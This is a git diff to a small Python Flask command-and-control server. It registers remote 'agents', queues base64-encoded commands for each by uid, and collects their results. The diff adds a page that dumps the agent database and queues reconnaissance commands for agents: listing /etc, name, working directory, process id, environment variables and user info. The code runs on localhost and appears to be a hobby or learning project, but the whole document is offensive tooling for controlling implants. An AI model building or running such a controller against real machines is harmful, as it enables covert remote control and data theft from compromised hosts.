@@ -1,11 +1,9 @@
 import hashlib
 import base64
+import pprint
 from flask import Flask, request
 
 # import ssl
-
-PORT = 9998
-active = "passive"
 
 cmds = []
 
@@ -31,6 +29,11 @@ def register_agent(uname, uid):
 		print("Agent already registered")
 
 
+@app.get("/")
+def show_agent_db():
+	return pprint.pformat(agent_db)
+
+
 @app.post("/register")
 def register():
 	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
@@ -51,12 +54,6 @@ def serve_commands(uid):
 	return base64.urlsafe_b64encode(bytes(commands.encode('utf-8')))
 
 
-# @app.post("/data")
-# def receive_data():
-# 	data = base64.urlsafe_b64decode(bytes(request.data))
-# 	print(str(data, "utf-8"))
-# 	return "", 200
-
 @app.post("/<uid>/data")
 def recieve_data(uid):
 	data = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split("::")
@@ -69,10 +66,12 @@ def recieve_data(uid):
 	print(agent_db)
 	return "", 200
 
+
 def add_command(command, uid):
 	global agent_db
 
 	agent_db[uid]["commands"][command] = "!EMPTY!"
+
 
 def add_all(command):
 	global agent_db
@@ -82,8 +81,10 @@ def add_all(command):
 
 if __name__ == "__main__":
 	cmds.append("ls::/etc")
-	cmds.append("BUILTIN::name")
-	cmds.append("BUILTIN::cwd")
-	cmds.append("BUILTIN::pid")
+	cmds.append("nme::")
+	cmds.append("cwd::")
+	cmds.append("pid::")
+	cmds.append("env::")
+	cmds.append("usr::")
 
-	app.run(host="localhost", port=PORT, debug=True)
+	app.run(host="localhost", port=9998, debug=True)
